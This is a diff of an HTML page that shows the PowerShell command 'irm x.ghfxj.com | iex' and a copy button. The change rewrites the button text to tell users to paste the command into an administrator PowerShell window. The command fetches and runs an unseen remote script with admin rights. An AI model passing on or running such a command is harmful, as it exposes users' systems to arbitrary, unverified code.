@@ -39,7 +39,7 @@
     <!-- 命令展示区域：复制时会从此处获取文本 -->
     <p>irm x.ghfxj.com | iex</p>
     <!-- 移除了无用的<a>包裹，直接使用按钮，并绑定复制功能 -->
-    <button id="copyBtn">拷贝上方命令到管理员Powershell窗口中</button>
+    <button id="copyBtn">单击我, 拷贝上方命令!</button>
 
     <script>
         (function() {
@@ -62,7 +62,7 @@
 
                 // 定义成功处理函数（显示“已复制!”并恢复）
                 const handleSuccess = () => {
-                    copyBtn.innerText = '已复制!';
+                    copyBtn.innerText = '已复制! 到管理员Powershell窗口中按右键粘贴!';
                     setTimeout(() => {
                         copyBtn.innerText = originalBtnText;
                     }, 1500);
@@ -122,4 +122,5 @@
     <!-- 小提示：样式微调仅增加按钮指针，其余外观与原设计保持一致 -->
 </body>
 </html>
+
 
